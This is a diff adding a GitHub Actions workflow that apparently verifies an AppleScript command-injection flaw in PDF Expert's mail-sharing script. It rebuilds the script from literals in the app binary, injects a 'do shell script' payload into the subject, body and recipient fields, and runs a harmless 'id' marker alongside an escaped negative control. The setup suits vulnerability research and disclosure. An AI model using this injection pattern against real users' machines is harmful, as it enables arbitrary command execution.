@@ -1,0 +1,166 @@
+name: pex-compile
+
+on:
+  workflow_dispatch:
+
+jobs:
+  compile:
+    runs-on: macos-14
+    timeout-minutes: 20
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Host
+        run: |
+          sw_vers
+          uname -m
+          ls -d /System/Applications/Mail.app
+          pgrep -x Mail || echo "Mail not running"
+
+      - name: Fetch PDF Expert 1187 and verify hash
+        run: |
+          set -euo pipefail
+          curl -fsSL -o pex.zip https://downloads.pdfexpert.com/pem3/versions/1187/PDFExpert.zip
+          shasum -a 256 pex.zip | tee zip.sha256
+          unzip -q pex.zip -d app
+          BIN="app/PDF Expert.app/Contents/MacOS/PDF Expert"
+          shasum -a 256 "$BIN" | tee bin.sha256
+
+      - name: Build the three script candidates from the shipped literals
+        run: |
+          set -euo pipefail
+          cat > mk.py <<'PY'
+          import struct, sys
+
+          BIN = "app/PDF Expert.app/Contents/MacOS/PDF Expert"
+          data = open(BIN, "rb").read()
+
+
+          def slice_base(d):
+              magic = struct.unpack(">I", d[:4])[0]
+              if magic not in (0xcafebabe, 0xbebafeca):
+                  return 0
+              n = struct.unpack(">I", d[4:8])[0]
+              for i in range(n):
+                  cpu = struct.unpack(">I", d[8 + i * 20:12 + i * 20])[0]
+                  off = struct.unpack(">I", d[8 + i * 20 + 8:12 + i * 20 + 8])[0]
+                  if cpu == 0x0100000C:
+                      return off
+              raise SystemExit("no arm64 slice")
+
+
+          BASE = slice_base(data)
+
+
+          def cstr(vaddr):
+              off = BASE + (vaddr - 0x100000000)
+              end = data.index(b"\0", off)
+              return data[off:end].decode("latin1")
+
+
+          L = {k: cstr(v) for k, v in {
+              "tos": 0x100dc6db0, "ccs": 0x100dc6de0, "bccs": 0x100dc6e00,
+              "att": 0x100dc6e20, "newmsg": 0x100dc6e40, "tail1": 0x100dc6e80,
+              "tail2": 0x100dc7060, "concat": 0x100dc71a0,
+          }.items()}
+
+          for k, v in L.items():
+              print("LIT %s %r" % (k, v[:60]))
+
+
+          def q(v):
+              return '"' + v + '"'
+
+
+          def build(subject_val, body_val, to_val="test@example.com", att_val="/tmp/report.pdf"):
+              # single-line lists: AppleScript has no implicit line continuation
+              return "".join([
+                  L["tos"], q(to_val), "\n",
+                  L["ccs"], q(""), "\n",
+                  L["bccs"], q(""), "\n",
+                  L["att"], q(att_val), "\n",
+                  L["newmsg"],
+                  "subject: ", q(subject_val), ", content:", q(" " + body_val),
+                  L["concat"],
+                  L["tail1"],
+                  L["tail2"],
+              ])
+
+
+          CMD = "/usr/bin/id > /tmp/pex_a"
+          PAY = 'x" & (do shell script "%s") & "' % CMD
+
+          open("A_clean.scpt", "w").write(build("Invoice", "See attached."))
+          open("B_subject.scpt", "w").write(build(PAY, "See attached."))
+          open("C_body.scpt", "w").write(build("Invoice", PAY))
+          open("D_tos.scpt", "w").write(build("Invoice", "See attached.", to_val=PAY))
+          PY
+          python3 mk.py
+          for f in A_clean B_subject C_body D_tos; do echo "=== $f ==="; cat $f.scpt; echo; echo "--- end ---"; done
+
+      - name: Compile each candidate with osacompile
+        run: |
+          set +e
+          for f in A_clean B_subject C_body D_tos; do
+            rm -rf $f.scptd
+            OUT=$(osacompile -o $f.scptd $f.scpt 2>&1)
+            RC=$?
+            echo "T_COMPILE[$f] rc=$RC"
+            if [ $RC -ne 0 ]; then echo "$OUT" | sed 's/^/  ERR: /'; fi
+          done
+
+      - name: Execute the injected subject candidate (marker watch)
+        run: |
+          set +e
+          rm -f /tmp/pex_a
+          osascript B_subject.scpt > b.out 2>&1 &
+          PID=$!
+          for i in $(seq 1 40); do [ -s /tmp/pex_a ] && break; sleep 1; done
+          kill $PID 2>/dev/null
+          wait $PID 2>/dev/null
+          echo "T_B_OUT: $(cat b.out)"
+          echo "T_B_MARKER_BEGIN"
+          cat /tmp/pex_a 2>/dev/null
+          echo "T_B_MARKER_END"
+
+      - name: Mail-free semantics test (same injected expression, record literal)
+        run: |
+          set +e
+          rm -f /tmp/pex_sem
+          cat > sem.scpt <<'SCPT'
+          set theRec to {subject: "x" & (do shell script "/usr/bin/id > /tmp/pex_sem") & "y", content:" z"}
+          return subject of theRec
+          SCPT
+          cat sem.scpt
+          OUT=$(osacompile -o sem.scptd sem.scpt 2>&1); echo "T_COMPILE[sem] rc=$? $OUT"
+          osascript sem.scpt > sem.out 2>&1
+          echo "T_SEM_OUT: $(cat sem.out)"
+          if [ -s /tmp/pex_sem ]; then echo "T_SEM_MARKER: [$(cat /tmp/pex_sem)]"; else echo "T_SEM_MARKER: []"; fi
+
+      - name: Negative control (escaped payload must not execute)
+        run: |
+          set +e
+          rm -f /tmp/pex_ctl
+          cat > ctl.scpt <<'SCPT'
+          set theRec to {subject: "x\" & (do shell script \"/usr/bin/id > /tmp/pex_ctl\") & \"y", content:" z"}
+          return subject of theRec
+          SCPT
+          cat ctl.scpt
+          osacompile -o ctl.scptd ctl.scpt 2>&1; echo "T_COMPILE[ctl] rc=$?"
+          osascript ctl.scpt > ctl.out 2>&1
+          echo "T_CTL_OUT: $(cat ctl.out)"
+          if [ -s /tmp/pex_ctl ]; then echo "T_CTL_MARKER: LEAK"; else echo "T_CTL_MARKER: clean"; fi
+
+      - name: Collect
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: pex-compile-evidence
+          path: |
+            *.scpt
+            b.out
+            sem.out
+            ctl.out
+            zip.sha256
+            bin.sha256
+          if-no-files-found: warn
